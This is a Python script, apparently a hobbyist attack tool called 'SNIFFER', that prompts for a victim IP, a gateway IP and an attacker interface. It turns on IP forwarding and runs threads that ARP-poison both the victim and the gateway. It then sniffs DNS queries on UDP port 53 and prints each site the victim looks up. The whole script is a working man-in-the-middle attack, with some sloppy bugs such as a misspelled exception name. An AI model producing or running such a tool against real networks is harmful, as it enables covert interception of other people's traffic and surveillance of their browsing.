#! /bin/python

from scapy.all import *
import threading
import os
import sys
# ARP poison , dns MITM 

# For decoration on the shell
# Includes colors, fonts, sizes
BLUE, RED, WHITE, YELLOW, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[32m', '\033[0m'


sys.stdout.write(RED + """  

		███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ 
		██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
		███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
		╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
		███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
		╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
				                                   		                                                                                                                                 
"""  + END + BLUE +
'' + 'SNIFFER'.format(RED, END).center(69) +
'\n' + 'Developed by: {}NIRAJ'.format(RED + END).center(76)+ '\n\n')	

VIP = input(' ' *10+'Victim IP: ')
GW = input(' ' *10+'Gateway IP: ')
IFACE = input(' ' *10+'Attacker Interface: ')

print('\nYou should run it as a root. If not, run it again ')

print('\t\t\nPoisoning Victim & Gateway! .. ')
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them
os.system('service whoopsie stop')  # daisy.ubuntu.com
 
def dnshandle(pkt):
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
			print('[*] Victim IP: ' + VIP + ' [*] Searched site: ' + (pkt.getlayer(DNS).qd.qname).decode('utf-8')) 


def v_poison():
	v = ARP(pdst=VIP, psrc=GW)
	while True:
		#try:	
		send(v,verbose=0,inter=1,loop=1)    
         	#except KeyboardInterupt:                     
		#	sys.exit(1)
def gw_poison():
	gw = ARP(pdst=GW, psrc=VIP)
	while True:
		try:
		       send(gw,verbose=0,inter=1,loop=1)
		except KeyboardInterupt:
			sys.exit(1)

vthread = []
gwthread = []	

 
while True:	# Threads 
		
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()		
        
	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	
	pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)
